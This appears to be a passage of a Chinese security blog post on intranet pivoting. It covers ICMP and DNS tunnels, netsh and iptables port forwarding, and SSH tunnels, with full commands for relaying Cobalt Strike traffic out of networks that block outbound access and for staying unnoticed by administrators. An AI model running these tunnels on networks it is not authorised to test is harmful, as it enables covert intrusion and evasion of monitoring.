+<h4 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h4><p>利用pingtunnel工具</p>
+<p>pingtunnel是吧tcp&#x2F;udp&#x2F;socks5流量伪装成icmp流量进行转发的工具</p>
+<p>需要root&#x2F;administrator权限</p>
+<p>服务端配置：.&#x2F;pingtunnel -type server</p>
+<p>客户端配置：</p>
+<p>pingtunnel.exe -type client -l:4455 -s vps -sock5 1</p>
+<p>pingtunnel.exe -type client -l:4455 -s vps -t internet:4455 -tcp 1</p>
+<p>作用：tcp不出网时在本地开启代理&#x2F;端口转发将tcp转成icmp出网，可以用于cs上线或者反向隧道搭建</p>
+<h5 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h5><p>服务端开启监听</p>
+<p>.&#x2F;pingtunnel -type server</p>
+<p>客户端连接服务端，本地监听4455端口，模式为socks5模式</p>
+<p>pingtunnel.exe -type client -l :4455 -s vps -sock5 1</p>
+<p> 端口转发服务，将服务端的某个服务端口转发到本地</p>
+<p>pingtunnel.exe -type client -l:4455 -s vps -t internet（服务端IP）:4455 -tcp 1</p>
+<p>实战操作，将服务端的ssh端口映射到本地</p>
+<p>pingtunnel.exe -type client -l:4455 -s cctest(vps) -t cctest:22 -tcp 1</p>
+<p>本地执行</p>
+<p>ssh <a class="link"   href="mailto:&#x72;&#111;&#111;&#x74;&#64;&#x31;&#50;&#x37;&#46;&#48;&#x2e;&#48;&#46;&#49;" >&#x72;&#111;&#111;&#x74;&#64;&#x31;&#50;&#x37;&#46;&#48;&#x2e;&#48;&#46;&#49; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> -p 4455这一步就可以连接到vps的ssh</p>
+<h3 id="UDP隧道（了解）"><a href="#UDP隧道（了解）" class="headerlink" title="UDP隧道（了解）"></a>UDP隧道（了解）</h3><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><h4 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h4><h5 id="通配DNS解析网址（没有域名可以用）"><a href="#通配DNS解析网址（没有域名可以用）" class="headerlink" title="通配DNS解析网址（没有域名可以用）"></a>通配DNS解析网址（没有域名可以用）</h5><p>xip.io、nip.io、sslip.io</p>
+<h5 id="主要作用"><a href="#主要作用" class="headerlink" title="主要作用"></a>主要作用</h5><p>免配置DNS解析</p>
+<p>使用CNAME绕过域名实名备案</p>
+<p>10.0.0.1.xip.io——–&gt;10.0.0.1</p>
+<p><a href="http://www.10.0.0.1.xip.io------->10.0.0.1">www.10.0.0.1.xip.io-------&gt;10.0.0.1</a></p>
+<p>mysite.10.0.0.1.xip.io——-&gt;10.0.0.1</p>
+<p>foo.bar.10.0.0.1.xip.io——-&gt;10.0.0.1</p>
+<h4 id="DNS隧道前置条件"><a href="#DNS隧道前置条件" class="headerlink" title="DNS隧道前置条件"></a>DNS隧道前置条件</h4><h5 id="域名服务器指向自己的服务器"><a href="#域名服务器指向自己的服务器" class="headerlink" title="域名服务器指向自己的服务器"></a>域名服务器指向自己的服务器</h5><p>确保所有DNS解析流量都经过自己的VPS服务器</p>
+<h5 id="服务器开启UDP-53端口"><a href="#服务器开启UDP-53端口" class="headerlink" title="服务器开启UDP 53端口"></a>服务器开启UDP 53端口</h5><p>确保根域名服务器能够及时发送DNS解析流量到自己服务器</p>
+<h4 id="正向DNS隧道"><a href="#正向DNS隧道" class="headerlink" title="正向DNS隧道"></a>正向DNS隧道</h4><p>使用DNS2TCP结合SSH隧道建立DNS隧道</p>
+<p>安装DNS2TCP</p>
+<p>服务器使用DNS2TCPD加载配置文件</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns2tcpd -f dns2tcp.conf -F -d 2</span><br></pre></td></tr></table></figure></div>
+
+<p>客户端使用DNS2TCPC将远程端口转发到本地</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns2tcpc -c -r ssh -l 26666 -d 4 -z tunnel.evevnote.com -k nsfo123</span><br></pre></td></tr></table></figure></div>
+
+<p>使用SSH打通Socks5隧道</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg root@127.0.0.1 -p 26666 -D 26667</span><br></pre></td></tr></table></figure></div>
+
+<p>TCP-over-DNS工具，可以看一看，很老的工具</p>
+<h4 id="反向DNS隧道"><a href="#反向DNS隧道" class="headerlink" title="反向DNS隧道"></a>反向DNS隧道</h4><p>DNSCat2</p>
+<h3 id="端口转发-1"><a href="#端口转发-1" class="headerlink" title="端口转发"></a>端口转发</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p>需要管理员权限</p>
+<p>通过一系列的配置或软件，将访问端口A的流量转发到端口B上，端口A和B可以为本地端口，也可以为远程端口</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">windows-----常用软件netsh</span><br><span class="line">Linux-----iptables SSH Ptunnel dns2tcp  DNSCat2等</span><br><span class="line">跨平台-----EW Terminal FRP NPS Icx portforward等</span><br></pre></td></tr></table></figure></div>
+
+<p>端口转发常用于网段之间的跳跃，即将搭建好的隧道端口转发出来</p>
+<p>大多数的端口转发场景都可以使用操作系统自带的网络配置软件实现</p>
+<p>有许多优势：无需落地软件配置即可、杀毒软件白名单、不用开启新进程、稳定可靠、不易被管理员发现</p>
+<h5 id="场景提要"><a href="#场景提要" class="headerlink" title="场景提要"></a>场景提要</h5><p>已经进入DMZ或者二层DMZ了但是核心区需要用办公网络进去，但是办公网络做了限制代理隧道进不去，这时候就可以通过端口转发将核心区端口转发到办公区</p>
+<p>1.映射本地服务</p>
+<p>实际场景中可能会遇到：内网策略禁止访问3389端口时，需要做端口转发</p>
+<p>将本地的3389端口转发到本地80端口</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport=80 connectaddress=127.0.0.1 connectport=3389</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808210803597.png"
+                      alt="image-20230808210803597"
+                ></p>
+<p>2.映射远程服务</p>
+<p>实际场景：只能通过跳板机去访问对应服务</p>
+<p>192.168.113.131是被控网络的内网资源，仅能通过192.168.113.130来访问</p>
+<p>将192.168.113.131的ssh服务（22端口）映射到192.168.113.130的2222端口</p>
+<p>效果是连接192.168.113.130:2222实际上是连接192.168.113.131:22(SSH)</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport=2222 connectaddress=192.168.113.131 connectport=22</span><br></pre></td></tr></table></figure></div>
+
+<p>我的场景是将一台主机192.168.81.161的3389转发到另一台主机192.168.81.138的2222端口</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808211634009.png"
+                      alt="image-20230808211634009"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808211640410.png"
+                      alt="image-20230808211640410"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808211732930.png"
+                      alt="image-20230808211732930"
+                ></p>
+<p>3.目标：映射远程的192.168.235.22:1234服务到本地的2345端口</p>
+<p>远程IP地址：192.168.235.22</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport=2345 connectaddress=192.168.235.22 connectport=1234</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+<p>查询端口转发的情况</p>
+<p>netsh interface portproxy show v4tov4</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808212150494.png"
+                      alt="image-20230808212150494"
+                ></p>
+<p>删除端口转发</p>
+<p>netsh interface portproxy delete v4tov4 40050</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808212221892.png"
+                      alt="image-20230808212221892"
+                ></p>
+<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p>Linux需要开启端口转发功能</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/sysctl.conf</span><br><span class="line">#将net.ipv4.ip_forward=0更改为net.ipv4.ip_forward=1</span><br><span class="line">sysctl -p</span><br><span class="line">#使数据转发功能生效</span><br></pre></td></tr></table></figure></div>
+
+<p>删除规则</p>
+<p>查看链条</p>
+<p>iptables -t nat -nvL</p>
+<p>iptables -t nat –list –line-number 有编号的就不用数了</p>
+<p>1 删除DNAT</p>
+<p>iptables -t nat -D PREROUTING 1</p>
+<p>2 删除SNAT</p>
+<p>iptables -t nat -D POSTROUTING 1</p>
+<h5 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h5><p>1.将外网访问192.168.113.131:8443端口&lt;—-转发到192.168.8.1:80需要添加两条</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#DNAT</span><br><span class="line">iptables -t nat -A PREROUTING -d 192.168.113.131 -p tcp --dport 8443 -j DNAT --to-destination 192.168.8.1:80</span><br><span class="line">#SNAT</span><br><span class="line">iptables -t nat -A POSTROUTING -d 192.168.8.1 -p tcp --dport 80 -j SNAT --to 192.168.113.131</span><br></pre></td></tr></table></figure></div>
+
+<p>2.转发CS监听（Linux出网其他服务器不出网，但要上线CS）</p>
+<p>iptables -t nat -A PREROUTING -d 192.168.113.131 -p tcp –dport 8443 -j DNAT –to-destination vps的IP:port</p>
+<p>iptables -t nat -A POSTROUTING -d （vps的IP） -p tcp –dport （vps的端口） -j SNAT –to 192.168.113.131</p>
+<p>然后CS上面创建监听就可以用192.168.113.131（内网主机的IP了）然后就可以在内网主机运行直接上线CS</p>
+<p>3.转发FRP</p>
+<h2 id="正向代理-端口转发"><a href="#正向代理-端口转发" class="headerlink" title="正向代理+端口转发"></a>正向代理+端口转发</h2><h3 id="SSH隧道"><a href="#SSH隧道" class="headerlink" title="SSH隧道"></a>SSH隧道</h3><p>需要更改VPS sshd配置文件，开启端口转发：GatewayPorts yes</p>
+<p>动态转发 -D（开启socks5服务）</p>
+<p>本地转发 -L（把远程某个端口转发到本地某端口上）</p>
+<p>远程转发 -R（把本地某端口转发到远程某端口上）</p>
+<h4 id="通过SSH建立内网隧道"><a href="#通过SSH建立内网隧道" class="headerlink" title="通过SSH建立内网隧道"></a>通过SSH建立内网隧道</h4><h5 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h5><p>需要root权限</p>
+<p>需要自己控制一台公网VPS</p>
+<p>需要更改VPS sshd配置文件，开启端口转发：GatewayPorts yes</p>
+<p>重启SSH服务：systemctl  restart sshd.service (service sshd status—-&gt;service sshd restart)</p>
+<h4 id="SSH隧道搭建"><a href="#SSH隧道搭建" class="headerlink" title="SSH隧道搭建"></a>SSH隧道搭建</h4><p>查看配置是否成功修改</p>
+<p>cat  &#x2F;etc&#x2F;sshd_config</p>
+<p>cat &#x2F;etc&#x2F;ssh&#x2F;sshd_config             ubuntu</p>
+<h5 id="场景-1"><a href="#场景-1" class="headerlink" title="场景"></a>场景</h5><p>1.ssh开启socks5服务</p>
+<p>ssh -qTfnN -D 0.0.0.0:监听端口 root@localhost</p>
+<p>ssh -qTfnN -D 0.0.0.0:21080 root@localhost</p>
+<p>ssh -qTfnN -R 0.0.0.0:31080(vps):0.0.0.0:1080 root@cctest</p>
+<p>ssh -qTfnN -L 0.0.0.0:1080:0.0.0.0:31080(vps) root@cctest</p>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> 内网代理与转发</li>
+        <li><strong>Author:</strong> yuBetter</li>
+        <li><strong>Created at:</strong> 2024-02-29 21:18:47</li>
+        
+            <li>
+                <strong>Updated at:</strong> 2024-02-29 21:19:25
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://yubetter.github.io/2024/02/29/内网代理与转发/
+        </li>
+        <li>
+            <strong>License:</strong> This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a>.
+        </li>
+    </ul>
+</div>
+
+                </div>
+            
+
+            
+
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                            rel="prev"
+                            href="/2024/02/29/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/"
+                            >
+                                <span class="left arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-left"></i>
+                                </span>
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">内网横向</span>
+                                    <span class="post-nav-item">Prev posts</span>
+                                </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                            rel="next"
+                            href="/2024/02/29/%E8%A1%A5%E5%85%85%EF%BC%9Azerologon%EF%BC%88CVE-2020-1472%EF%BC%89/"
+                            >
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">补充：zerologon（CVE-2020-1472）</span>
+                                    <span class="post-nav-item">Next posts</span>
+                                </span>
+                                <span class="right arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+
+            
+                <div class="comment-container">
+                    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fa-solid fa-comments"></i>&nbsp;Comments
+    </div>
+    
+
+        
+            
+ 
+    <div id="waline"></div>
+    <script type="module"  data-pjax>
+        import { init } from 'https://evan.beee.top/js/waline.mjs';
+
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://example.example.com',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+            });
+        }
+
+        if ('true') {
+            const loadWalineTimeout = setTimeout(() => {
+                loadWaline();
+                clearTimeout(loadWalineTimeout);
+            }, 1000);
+        } else {
+            window.addEventListener('DOMContentLoaded', loadWaline);
+        }
+        
+    </script>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">内网代理与转发</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E4%B8%8E%E8%BD%AC%E5%8F%91"><span class="nav-text">内网代理与转发</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E6%A6%82%E8%BF%B0"><span class="nav-text">内网代理转发概述</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86"><span class="nav-text">正向代理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86"><span class="nav-text">反向代理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="nav-text">端口转发</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8"><span class="nav-text">端口复用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%90%86%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%B7%A5%E5%85%B7"><span class="nav-text">代理客户端工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7"><span class="nav-text">浏览器代理工具</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%90%86%E5%8D%8F%E8%AE%AE%E4%BB%A5%E5%8F%8A%E5%B7%A5%E5%85%B7"><span class="nav-text">代理协议以及工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF"><span class="nav-text">常见的代理技术</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Socks4a"><span class="nav-text">Socks4a</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSF%EF%BC%88%E4%B8%8D%E5%B8%B8%E7%94%A8%EF%BC%89"><span class="nav-text">MSF（不常用）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FRP%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86"><span class="nav-text">FRP反向代理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nps"><span class="nav-text">nps</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ICMP"><span class="nav-text">ICMP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UDP%E9%9A%A7%E9%81%93%EF%BC%88%E4%BA%86%E8%A7%A3%EF%BC%89"><span class="nav-text">UDP隧道（了解）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DNS"><span class="nav-text">DNS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-1"><span class="nav-text">端口转发</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="nav-text">正向代理+端口转发</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SSH%E9%9A%A7%E9%81%93"><span class="nav-text">SSH隧道</span></a></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+            </div>
+        
+    </div>
+</div>
+
+
+                
+
+            </div>
+            
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">yuBetter</a>
+        </div>
+        
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv" class="busuanzi_container_site_uv">
+                        VISITOR COUNT&nbsp;<span id="busuanzi_value_site_uv" class="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="busuanzi_container_site_pv">
+                        TOTAL PAGE VIEWS&nbsp;<span id="busuanzi_value_site_pv" class="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            <span class="powered-by-container">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a></span>
+                <br>
+            <span class="theme-version-container">THEME&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.1.1</a>
+        </div>
+        
+        
+        
+            <div id="start_div" style="display:none">
+                2022/8/17 11:45:14
+            </div>
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+        
+            <script async data-pjax>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-expand-width flex-center">
+            <i class="fa-regular fa-expand"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+
+</main>
+
+
+
+<script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/utils.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/main.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/layouts/navbarShrink.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/scrollTopBottom.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/lightDarkSwitch.js"></script>
+
+
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/localSearch.js"></script>
+
+
+
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/codeBlock.js"></script>
+
+
+
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/layouts/lazyload.js"></script>
+
+
+
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/runtime.js"></script>
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/layouts/odometer.min.js"></script>
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/assets/odometer-theme-minimal.css">
+
+
+
+  <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/libs/Typed.min.js"></script>
+  <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/plugins/typed.js"></script>
+
+
+
+
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/tocToggle.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/libs/anime.min.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/layouts/toc.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/plugins/tabs.js"></script>
+    
+</div>
+
+
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax',
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            Global.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            Global.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            Global.refresh();
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
